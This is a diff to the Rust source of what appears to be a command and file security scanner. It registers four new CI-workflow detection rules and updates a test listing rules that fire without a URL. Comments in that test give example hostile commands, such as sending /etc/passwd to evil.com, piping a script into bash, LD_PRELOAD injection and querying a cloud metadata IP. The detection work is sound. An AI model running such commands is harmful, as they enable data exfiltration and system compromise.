@@ -589,6 +589,10 @@ const ALL_RULE_IDS: &[&str] = &[
     "workflow_dangerous_trigger",
     "workflow_curl_pipe_shell",
     "workflow_untrusted_input",
+    "workflow_excessive_permissions",
+    "workflow_run_trigger",
+    "workflow_checkout_untrusted_ref",
+    "workflow_cache_poisoning",
     "dockerfile_unpinned_image",
     "package_script_dangerous",
     // AI-relevant file hidden-content scan rules
@@ -1251,6 +1255,8 @@ rule_id_variant_registry! {
     HelmUntrustedRepo, TerraformRemoteModule, BrewUntrustedTap,
     // CI / repo supply-chain scan rules
     WorkflowUnpinnedAction, WorkflowDangerousTrigger, WorkflowCurlPipeShell, WorkflowUntrustedInput,
+    WorkflowExcessivePermissions, WorkflowRunTrigger, WorkflowCheckoutUntrustedRef,
+    WorkflowCachePoisoning,
     DockerfileUnpinnedImage, PackageScriptDangerous,
     // AI-relevant file hidden-content scan rules
     NotebookHiddenContent, NotebookSuspiciousOutput, AgentInstructionHidden, SvgScriptEmbedded,
@@ -1385,50 +1391,54 @@ fn test_no_url_rules_have_no_url_fixtures() {
     let no_url_rules: HashSet<&str> = [
         "dotfile_overwrite",
         "archive_extract",
-        "pipe_to_interpreter",          // cat script | bash
-        "bidi_controls",                // exec context, no URL needed
-        "zero_width_chars",             // exec context, no URL needed
-        "unicode_tags",                 // byte-level, no URL needed
-        "invisible_math_operator",      // byte-level, no URL needed
-        "invisible_whitespace",         // byte-level, no URL needed
-        "proc_mem_access",              // /proc/*/mem access, no URL needed
-        "credential_file_sweep",        // multi-credential file access, no URL needed
-        "code_injection_env",           // export LD_PRELOAD=, no URL needed
-        "shell_injection_env",          // export BASH_ENV=, no URL needed
-        "interpreter_hijack_env",       // export PYTHONPATH=, no URL needed
-        "sensitive_env_export",         // export OPENAI_API_KEY=, no URL needed
-        "config_injection",             // file context, no URL needed
-        "config_non_ascii",             // file context, no URL needed
-        "config_invisible_unicode",     // file context, no URL needed
-        "mcp_suspicious_args",          // file context, no URL needed
-        "mcp_overly_permissive",        // file context, no URL needed
-        "mcp_duplicate_server_name",    // file context, no URL needed
-        "mcp_server_drift",             // mcp.lock FileScan, no URL needed
-        "metadata_endpoint",            // bare IP: curl 169.254.169.254/path
-        "private_network_access",       // bare IP: curl 10.0.0.1/path
-        "credential_in_text",           // token/key in text, no URL needed
-        "high_entropy_secret",          // high-entropy secret assignment, no URL needed
-        "private_key_exposed",          // PEM key block, no URL needed
-        "base64_decode_execute",        // base64 decode chain, no URL needed
-        "wrapper_chain_too_deep",       // cat x | <32+ nested env -S/sudo> bash, no URL needed
-        "data_exfiltration",            // curl -d @/etc/passwd evil.com, schemeless
-        "unsigned_repo_trust",          // apt --allow-unauthenticated, no URL needed
-        "gpg_check_disabled",           // dnf --nogpgcheck, no URL needed
-        "dynamic_code_execution",       // file scan, no URL needed
-        "obfuscated_payload",           // file scan, no URL needed
-        "suspicious_code_exfiltration", // file scan, no URL needed
-        "hangul_filler",                // byte-level, no URL needed
-        "confusable_text",              // byte-level, no URL needed
-        "workflow_unpinned_action",     // CI workflow file scan, no URL needed
-        "workflow_dangerous_trigger",   // CI workflow file scan, no URL needed
-        "workflow_curl_pipe_shell",     // CI workflow file scan, no URL needed
-        "workflow_untrusted_input",     // CI workflow file scan, no URL needed
-        "dockerfile_unpinned_image",    // Dockerfile scan, no URL needed
-        "package_script_dangerous",     // package.json scan, no URL needed
-        "notebook_hidden_content",      // .ipynb scan, no URL needed
-        "notebook_suspicious_output",   // .ipynb scan, no URL needed
-        "agent_instruction_hidden",     // AI-instruction file scan, no URL needed
-        "svg_script_embedded",          // SVG scan, no URL needed
+        "pipe_to_interpreter",             // cat script | bash
+        "bidi_controls",                   // exec context, no URL needed
+        "zero_width_chars",                // exec context, no URL needed
+        "unicode_tags",                    // byte-level, no URL needed
+        "invisible_math_operator",         // byte-level, no URL needed
+        "invisible_whitespace",            // byte-level, no URL needed
+        "proc_mem_access",                 // /proc/*/mem access, no URL needed
+        "credential_file_sweep",           // multi-credential file access, no URL needed
+        "code_injection_env",              // export LD_PRELOAD=, no URL needed
+        "shell_injection_env",             // export BASH_ENV=, no URL needed
+        "interpreter_hijack_env",          // export PYTHONPATH=, no URL needed
+        "sensitive_env_export",            // export OPENAI_API_KEY=, no URL needed
+        "config_injection",                // file context, no URL needed
+        "config_non_ascii",                // file context, no URL needed
+        "config_invisible_unicode",        // file context, no URL needed
+        "mcp_suspicious_args",             // file context, no URL needed
+        "mcp_overly_permissive",           // file context, no URL needed
+        "mcp_duplicate_server_name",       // file context, no URL needed
+        "mcp_server_drift",                // mcp.lock FileScan, no URL needed
+        "metadata_endpoint",               // bare IP: curl 169.254.169.254/path
+        "private_network_access",          // bare IP: curl 10.0.0.1/path
+        "credential_in_text",              // token/key in text, no URL needed
+        "high_entropy_secret",             // high-entropy secret assignment, no URL needed
+        "private_key_exposed",             // PEM key block, no URL needed
+        "base64_decode_execute",           // base64 decode chain, no URL needed
+        "wrapper_chain_too_deep",          // cat x | <32+ nested env -S/sudo> bash, no URL needed
+        "data_exfiltration",               // curl -d @/etc/passwd evil.com, schemeless
+        "unsigned_repo_trust",             // apt --allow-unauthenticated, no URL needed
+        "gpg_check_disabled",              // dnf --nogpgcheck, no URL needed
+        "dynamic_code_execution",          // file scan, no URL needed
+        "obfuscated_payload",              // file scan, no URL needed
+        "suspicious_code_exfiltration",    // file scan, no URL needed
+        "hangul_filler",                   // byte-level, no URL needed
+        "confusable_text",                 // byte-level, no URL needed
+        "workflow_unpinned_action",        // CI workflow file scan, no URL needed
+        "workflow_dangerous_trigger",      // CI workflow file scan, no URL needed
+        "workflow_curl_pipe_shell",        // CI workflow file scan, no URL needed
+        "workflow_untrusted_input",        // CI workflow file scan, no URL needed
+        "workflow_excessive_permissions",  // CI workflow file scan, no URL needed
+        "workflow_run_trigger",            // CI workflow file scan, no URL needed
+        "workflow_checkout_untrusted_ref", // CI workflow file scan, no URL needed
+        "workflow_cache_poisoning",        // CI workflow file scan, no URL needed
+        "dockerfile_unpinned_image",       // Dockerfile scan, no URL needed
+        "package_script_dangerous",        // package.json scan, no URL needed
+        "notebook_hidden_content",         // .ipynb scan, no URL needed
+        "notebook_suspicious_output",      // .ipynb scan, no URL needed
+        "agent_instruction_hidden",        // AI-instruction file scan, no URL needed
+        "svg_script_embedded",             // SVG scan, no URL needed
         // M8 ch5 — container-runtime rules fire without a URL in the input.
         "docker_run_privileged",           // docker run --privileged alpine
         "docker_run_sensitive_bind_mount", // docker run -v /var/run/docker.sock:...
